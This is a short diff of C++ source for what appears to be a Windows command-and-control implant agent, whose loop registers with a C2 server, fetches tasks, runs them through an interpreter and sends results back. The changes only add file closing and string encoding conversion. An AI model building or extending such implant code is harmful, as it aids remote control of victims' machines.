@@ -17,12 +17,14 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PSTR lpCmdLine,
     if (GetFileAttributes(config_path) != INVALID_FILE_ATTRIBUTES) {
         std::wifstream cfg_file(config_path);
         std::getline(cfg_file, agent_id);
+        cfg_file.close();
     }
     else {  
         nlohmann::json registration = communication::RegisterAgent(C2);
         agent_id = std::to_wstring(registration["agent_id"].get<int>());
         std::wofstream cfg_file(config_path);
         cfg_file << agent_id;
+        cfg_file.close();
     }
 
     while (true) {
@@ -30,7 +32,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PSTR lpCmdLine,
 
         if (task.contains("task")) {
             nlohmann::json results;
-            results["result"] = interpreter::InterpretTask(task["task"].get<std::wstring>());
+            results["result"] = misc::WideStringToUTF8(interpreter::InterpretTask(misc::UTF8ToWideString(task["task"])));
             communication::SubmitResults(C2, agent_id, results);
         }
 
